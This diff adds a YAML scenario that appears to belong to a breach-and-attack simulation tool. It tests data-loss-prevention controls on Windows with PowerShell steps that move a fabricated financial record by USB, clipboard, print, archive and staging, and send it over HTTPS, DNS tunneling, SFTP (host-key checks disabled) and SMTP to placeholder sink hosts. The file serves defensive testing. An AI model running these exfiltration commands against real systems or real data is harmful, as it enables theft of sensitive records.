@@ -1,0 +1,479 @@
+id: dlp-exfiltration-multichannel
+name: DLP Exfiltration Validation — All Channels
+description: >
+  Combines every DLP exfiltration channel built so far into one scenario:
+  the five agent-native, local-marker-observed channels from
+  dlp-exfiltration-validation.yaml (USB-mounted-drive copy, clipboard,
+  print spool, archive staging, local staging to a shared path) plus the
+  four sink-verified network channels (HTTPS, DNS tunneling, SFTP, SMTP)
+  from dlp-exfiltration-sink-https.yaml, dlp-exfiltration-dns-tunnel.yaml,
+  dlp-exfiltration-sftp.yaml, and dlp-exfiltration-smtp.yaml. Each step is
+  copied verbatim from its source scenario -- same technique_id, same
+  command, same detection_profiles entry -- nothing about any individual
+  channel's behavior or verdict logic changes by being bundled here.
+
+  Use the run wizard's Customize step to narrow this down to a chosen
+  subset of the 9 techniques below instead of running all of them; the
+  5 source scenarios and 4 sink-verified channel scenarios each remain
+  available separately too, for a direct single-channel run with no
+  Customize step needed.
+
+  Two distinct verification models are present side by side:
+  - The five agent-native channels (T1052.001, T1115, T1052, T1560.001,
+    T1074.001) are local/agent-observed only -- each step's own script
+    performs its post-condition check and reports OperationSucceeded or
+    OperationBlocked, never a full DLP policy verdict.
+  - The four network channels (T1567, T1071.004, T1048.002, T1048.003)
+    are sink-verified -- the verdict comes from whether the platform's
+    own purpose-built sink/listener actually received the payload,
+    ground truth resolved server-side, never from anything the step's
+    own script can locally confirm.
+
+  Preconditions: the USB-copy step requires a removable drive attached to
+  the endpoint (mounted virtual media is sufficient) and the print step
+  requires a configured default printer (a virtual/PDF printer is
+  sufficient) -- either step reports SKIP, not FAIL, if its precondition
+  isn't met on a given host. The SFTP step similarly reports skip: if
+  sftp.exe (OpenSSH Client) isn't present.
+
+  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
+  real. Every local-channel step is self-cleaning -- no residual files,
+  clipboard content, print jobs, or archives are left behind. Every
+  network-channel sink stores only a hash of the received payload, never
+  the raw content, and every destination is this same on-prem deployment
+  -- no external server is ever contacted. Windows only.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - dlp
+  - data-protection-validation
+  - exfiltration
+  - dns-tunneling
+  - sftp
+  - smtp
+  - multi-channel
+  - windows
+  - mitre-attack
+  - bfsi
+  - india
+mitre_phases:
+  - collection
+  - exfiltration
+  - command-and-control
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Channel 1 — USB-mounted-drive copy (T1052.001)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — USB Exfiltration of Regulated Data (T1052.001)"
+    technique_id: T1052.001
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Copies a synthetic multi-type sensitive record file to a removable drive if one is attached, then deletes it immediately. No persistence, no real regulated data."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11: file creation on removable-media drive letter"
+      - "Security EID 4663: object access on removable-media volume"
+    detection:
+      - "DLP: file-copy to removable-media volume matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $usbDrive = Get-Volume | Where-Object { $_.DriveType -eq 'Removable' -and $_.DriveLetter } | Select-Object -First 1
+      if (-not $usbDrive) {
+        Write-Output "SKIP: no removable USB drive present on this host - DLP USB-copy validation requires physical or virtual removable media attached."
+      } else {
+        $srcFile = Join-Path $env:TEMP "bas_sim_dlp_records_$runId.csv"
+        $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-$runId,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+        Set-Content -Path $srcFile -Value $csvContent -Encoding utf8
+        $dest = "$($usbDrive.DriveLetter):\bas_sim_dlp_records_$runId.csv"
+        Copy-Item -Path $srcFile -Destination $dest -ErrorAction SilentlyContinue
+        if (Test-Path $dest) {
+          Write-Output "EXEC T1052.001: multi-type sensitive record file copied to removable drive $($usbDrive.DriveLetter): unimpeded. [BAS-SIM-DLP-USB]"
+          Write-Output "FAIL: sensitive record file (PAN/Aadhaar/SWIFT/UPI/credit-card patterns) copied to USB without being blocked."
+          Remove-Item -Path $dest -ErrorAction SilentlyContinue
+          Write-Output "DLP_OBSERVATION: OperationSucceeded"
+        } else {
+          Write-Output "EXEC T1052.001: copy to removable drive $($usbDrive.DriveLetter): was blocked or failed. [BAS-SIM-DLP-USB]"
+          Write-Output "DLP_OBSERVATION: OperationBlocked"
+        }
+        Remove-Item -Path $srcFile -ErrorAction SilentlyContinue
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 2 — Clipboard (T1115)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Clipboard Exposure of Regulated Data (T1115)"
+    technique_id: T1115
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes a synthetic multi-type sensitive record to the clipboard, checks whether it landed, then restores the original clipboard content. No persistence, no real regulated data."
+    reversible: true
+    telemetry:
+      - "Clipboard User Service activity (no dedicated Windows event ID; DLP clipboard-hook telemetry is vendor-specific)"
+    detection:
+      - "DLP: clipboard-monitoring hook matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-$runId,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $originalClip = $null
+      try { $originalClip = Get-Clipboard -Raw -ErrorAction SilentlyContinue } catch {}
+      Set-Clipboard -Value $csvContent -ErrorAction SilentlyContinue
+      Start-Sleep -Milliseconds 300
+      $nowClip = $null
+      try { $nowClip = Get-Clipboard -Raw -ErrorAction SilentlyContinue } catch {}
+      if ($nowClip -and $nowClip.Contains('ABCDE1234F')) {
+        Write-Output "EXEC T1115: multi-type sensitive record content set to clipboard unimpeded. [BAS-SIM-DLP-CLIP]"
+        Write-Output "FAIL: sensitive record content (PAN/Aadhaar/SWIFT/UPI/credit-card patterns) was placed on the clipboard without being blocked or cleared."
+        Write-Output "DLP_OBSERVATION: OperationSucceeded"
+      } else {
+        Write-Output "EXEC T1115: clipboard write of sensitive content was blocked or cleared. [BAS-SIM-DLP-CLIP]"
+        Write-Output "DLP_OBSERVATION: OperationBlocked"
+      }
+      if ($null -ne $originalClip) { Set-Clipboard -Value $originalClip -ErrorAction SilentlyContinue } else { Set-Clipboard -Value '' -ErrorAction SilentlyContinue }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 3 — Print spool (T1052)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Print Exfiltration of Regulated Data (T1052)"
+    technique_id: T1052
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Submits a synthetic multi-type sensitive record to the default printer's spool queue if one is configured, then removes the job immediately. No persistence, no real regulated data."
+    reversible: true
+    telemetry:
+      - "Print spooler EID 307/347: print job submitted/completed"
+    detection:
+      - "DLP: print-job content inspection matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $printer = Get-CimInstance -ClassName Win32_Printer -ErrorAction SilentlyContinue | Where-Object { $_.Default -eq $true } | Select-Object -First 1
+      if (-not $printer) {
+        Write-Output "SKIP: no default printer configured on this host - DLP print-exfiltration validation requires a configured printer (physical or virtual/PDF)."
+      } else {
+        $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-$runId,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+        $srcFile = Join-Path $env:TEMP "bas_sim_dlp_print_$runId.txt"
+        Set-Content -Path $srcFile -Value $csvContent -Encoding utf8
+        try {
+          Get-Content -Path $srcFile | Out-Printer -Name $printer.Name -ErrorAction Stop
+          Start-Sleep -Milliseconds 500
+          $job = Get-PrintJob -PrinterName $printer.Name -ErrorAction SilentlyContinue | Where-Object { $_.DocumentName -match 'bas_sim_dlp_print' -or $_.JobStatus -match 'Printing|Spooling|Normal' } | Select-Object -First 1
+          if ($job) {
+            Write-Output "EXEC T1052: sensitive record content submitted to print spooler ($($printer.Name)) unimpeded. [BAS-SIM-DLP-PRINT]"
+            Write-Output "FAIL: sensitive record content (PAN/Aadhaar/SWIFT/UPI/credit-card patterns) reached the print spooler without being blocked."
+            Remove-PrintJob -PrinterName $printer.Name -ID $job.ID -ErrorAction SilentlyContinue
+            Write-Output "DLP_OBSERVATION: OperationSucceeded"
+          } else {
+            Write-Output "EXEC T1052: print submission did not appear in the spool queue - blocked or intercepted. [BAS-SIM-DLP-PRINT]"
+            Write-Output "DLP_OBSERVATION: OperationBlocked"
+          }
+        } catch {
+          Write-Output "EXEC T1052: print submission threw an error - treated as blocked. [BAS-SIM-DLP-PRINT]"
+          Write-Output "DLP_OBSERVATION: OperationBlocked"
+        }
+        Remove-Item -Path $srcFile -ErrorAction SilentlyContinue
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 4 — Archive staging (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Archive Staging of Regulated Data (T1560.001)"
+    technique_id: T1560.001
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Compresses a synthetic multi-type sensitive record into a standard ZIP archive via Compress-Archive, then deletes both files immediately. No password protection (no external archiver bundled with the agent); no persistence, no real regulated data."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11: .zip file creation in %TEMP%"
+    detection:
+      - "DLP: archive-creation content inspection matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-$runId,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $srcFile = Join-Path $env:TEMP "bas_sim_dlp_archive_src_$runId.csv"
+      $zipFile = Join-Path $env:TEMP "bas_sim_dlp_archive_$runId.zip"
+      Set-Content -Path $srcFile -Value $csvContent -Encoding utf8
+      try {
+        Compress-Archive -Path $srcFile -DestinationPath $zipFile -ErrorAction Stop
+      } catch {}
+      if (Test-Path $zipFile) {
+        Write-Output "EXEC T1560.001: sensitive record file archived to $zipFile unimpeded. [BAS-SIM-DLP-ZIP]"
+        Write-Output "FAIL: sensitive record content (PAN/Aadhaar/SWIFT/UPI/credit-card patterns) was compressed into an archive without being blocked."
+        Write-Output "DLP_OBSERVATION: OperationSucceeded"
+      } else {
+        Write-Output "EXEC T1560.001: archive creation was blocked or failed. [BAS-SIM-DLP-ZIP]"
+        Write-Output "DLP_OBSERVATION: OperationBlocked"
+      }
+      Remove-Item -Path $srcFile,$zipFile -ErrorAction SilentlyContinue
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 5 — Local staging to a shared path (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Local Staging of Regulated Data to a Shared Path (T1074.001)"
+    technique_id: T1074.001
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes a synthetic multi-type sensitive record to C:\\Users\\Public (a shared/world-readable local path), then deletes it immediately. No persistence, no real regulated data."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11: file creation under C:\\Users\\Public"
+    detection:
+      - "DLP: endpoint file-write inspection on shared/public local paths matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-$runId,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $stagingDir = 'C:\Users\Public\bas_sim_dlp_staging'
+      $dest = Join-Path $stagingDir "records_$runId.csv"
+      try {
+        New-Item -Path $stagingDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+        Set-Content -Path $dest -Value $csvContent -Encoding utf8 -ErrorAction Stop
+      } catch {}
+      if (Test-Path $dest) {
+        Write-Output "EXEC T1074.001: sensitive record file staged to a shared local path ($stagingDir) unimpeded. [BAS-SIM-DLP-STAGE]"
+        Write-Output "FAIL: sensitive record content (PAN/Aadhaar/SWIFT/UPI/credit-card patterns) was written to a shared local staging path without being blocked."
+        Write-Output "DLP_OBSERVATION: OperationSucceeded"
+      } else {
+        Write-Output "EXEC T1074.001: staging write to shared local path was blocked or failed. [BAS-SIM-DLP-STAGE]"
+        Write-Output "DLP_OBSERVATION: OperationBlocked"
+      }
+      Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 6 — Sink-verified HTTPS (T1567)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Sink-Verified HTTPS Exfiltration (T1567)"
+    technique_id: T1567
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic multi-type sensitive record to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS POST body matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      try {
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$csvContent; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "EXEC T1567: multi-type sensitive record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
+      } catch {
+        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-DLP-SINK-HTTPS]"
+      }
+      # No local DLP_OBSERVATION marker here -- this step's verdict comes
+      # entirely from whether the sink endpoint received the token, resolved
+      # server-side by internal/verifysync, not from anything this script
+      # can locally confirm.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 7 — Sink-verified DNS tunneling (T1071.004)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — DNS Tunneling Exfiltration (T1071.004)"
+    technique_id: T1071.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic sensitive record split across query labels. No real DNS infrastructure is queried and no data leaves the environment -- the destination is this same on-prem deployment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
+      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
+    detection:
+      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      function ConvertTo-Base32([byte[]]$Bytes) {
+        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
+        $bits = ''
+        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
+        $result = ''
+        for ($i = 0; $i -lt $bits.Length; $i += 5) {
+          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
+          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
+        }
+        return $result
+      }
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($csvContent)
+      $encoded = ConvertTo-Base32 $payloadBytes
+      $chunkSize = 52
+      $chunks = @()
+      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
+        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
+      }
+      $sent = 0
+      try {
+        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+        for ($i = 0; $i -lt $chunks.Count; $i++) {
+          $seq = "{0:D3}" -f ($i + 1)
+          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
+          $sent++
+        }
+        Write-Output "EXEC T1071.004: multi-type sensitive record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
+      } catch {
+        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
+      }
+      # No local DLP_OBSERVATION marker here -- this step's verdict comes
+      # entirely from whether the DNS listener fully reassembled the
+      # campaign, resolved server-side by internal/dnssink +
+      # internal/verifysync, not from anything this script can locally
+      # confirm.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 8 — Sink-verified SFTP (T1048.002)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — SFTP Exfiltration (T1048.002)"
+    technique_id: T1048.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a single small file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). No real SFTP server is contacted and no data leaves the environment -- the destination is this same on-prem deployment. If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
+      - "Sysmon EID 1: sftp.exe process creation"
+    detection:
+      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
+      if (-not $sftpCmd) {
+        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
+        exit 0
+      }
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $tempFile = New-TemporaryFile
+      Set-Content -Path $tempFile -Value $csvContent -NoNewline
+      $remoteFile = "{{SINK_TOKEN}}.dat"
+      $batchFile = New-TemporaryFile
+      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
+      try {
+        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
+        $exitCode = $LASTEXITCODE
+        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
+        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
+        Write-Output "EXEC T1048.002: SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } finally {
+        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SFTP sink
+      # actually received the upload, resolved server-side by
+      # internal/sftpsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own exit code.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Channel 9 — Sink-verified SMTP (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — SMTP Exfiltration (T1048.003)"
+    technique_id: T1048.003
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Sends a single small email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted and no data leaves the environment -- the destination is this same on-prem deployment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
+      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
+    detection:
+      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
+      $token = "{{SINK_TOKEN}}"
+      $body = "$token`n$csvContent"
+      try {
+        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
+          -Subject $token -Body $body `
+          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
+          -ErrorAction Stop
+        Write-Output "DLP_OBSERVATION: send_mail_result=success"
+        Write-Output "EXEC T1048.003: SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SMTP sink
+      # actually received a message with a matching Subject, resolved
+      # server-side by internal/smtpsink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
